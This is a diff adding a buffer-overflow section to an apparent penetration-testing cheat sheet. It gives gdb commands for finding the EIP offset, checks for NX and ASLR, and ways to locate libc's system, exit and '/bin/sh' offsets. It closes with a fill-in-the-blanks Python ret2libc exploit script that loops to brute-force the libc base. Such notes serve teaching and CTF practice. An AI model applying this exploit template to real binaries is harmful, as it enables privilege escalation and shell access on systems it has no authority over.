@@ -446,6 +446,83 @@ Check protections (NX is DEP = Data Execution Prevention)
 ```
 checksec
 ```
+Create a pattern
+```
+pattern create
+```
+Run the binary with the patern
+
+Find the offset
+```
+pattern offset $eip
+```
+Run the binary with the offset breakpoint to confirm
+```
+r $(python -c 'print("A"*offser_breakpoint + "B"*4)')
+```
+If NX is disable, you can execute commands
+
+### NX enable:
+
+Check the system architecture 
+```
+uname -r 
+```
+Check if ASLR is enable ("1" for disable, "2" for enable)
+```
+cat /proc/sys/kernel/randomize_va_space
+```
+Check Dynamic Dependencies
+```
+ldd /path/to/binary
+```
+#### Ret2libc
+
+eip --> system_addr + exit_addr + bin_sh_addr
+
+Check the system_addr_off and exit_addr_off
+```
+readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
+```
+Check the bin_sh_addr_off
+```
+strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
+```
+#### Exploit.py
+```
+#!/usr/bin/python3
+
+from struct import pack
+from subprocess import call
+
+full_path_to_binary =
+
+offset = 
+
+junk = b"A"*offset
+
+# ret2libc -> system_addr + exit_addr + bin_sh_addr
+
+# All varibles must have the same number of characters
+
+base_libc_addr = 
+
+system_addr_off = 
+
+exit_addr_off = 
+
+bin_sh_addr_off = 
+
+system_addr = pack("<L", base_libc_addr + system_addr_off)
+exit_addr = pack("<L", base_libc_addr + exit_addr_off)
+bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)
+
+
+payload = junk + system_addr + exit_addr + bin_sh_addr
+
+while True:
+    ret = call([full_path_to_binary, payload])
+```
 
 # Windows
 
